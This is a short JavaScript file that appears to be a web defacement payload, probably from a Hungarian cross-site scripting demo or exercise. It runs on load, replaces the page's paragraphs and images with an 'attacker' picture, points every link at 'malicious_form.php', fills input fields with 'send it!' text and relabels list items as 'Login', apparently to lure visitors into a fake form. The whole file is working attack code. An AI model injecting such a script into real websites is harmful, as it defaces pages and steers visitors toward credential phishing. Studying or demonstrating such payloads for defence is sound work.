function collapseWebsite() {
  var body = document.getElementsByTagName("body");
  body[0].style.backgroundImage = "";
  
  var p = document.getElementsByTagName("p");
  for (var i = 0; i < p.length; i++) {
    p[i].style.backgroundColor = "red";
	p[i].style.color = "yellow";
	p[i].innerHTML = "<img src='img/himark.gif' alt='támado kepe' width='500px'>";
  }
  
  var img = document.getElementsByTagName("img");
  for (var i = 0; i < img.length; i++) {
	img[i].src = "img/himark.gif";
  }
  
  var a = document.getElementsByTagName("a");
  for (var i = 0; i < a.length; i++) {
	a[i].href = "malicious_form.php";
  }
  
  var input = document.getElementsByTagName("input");
  for (var i = 0; i < input.length; i++) {
    input[i].style.backgroundColor = "red";
	input[i].style.color = "yellow";
	input[i].value = "KÜLDJ EL! KÜLDJ EL! KÜLDJ EL!";
  }  
  
  var li = document.getElementsByTagName("li");
  for (var i = 0; i < li.length; i++) {
	li[i].innerHTML = "Bejelentkezés";
  }
  
  var div = document.getElementsByTagName("div");
  for (var i = 0; i < div.length; i++) {
	div[i].style.color = "green";
  }  
}

collapseWebsite();
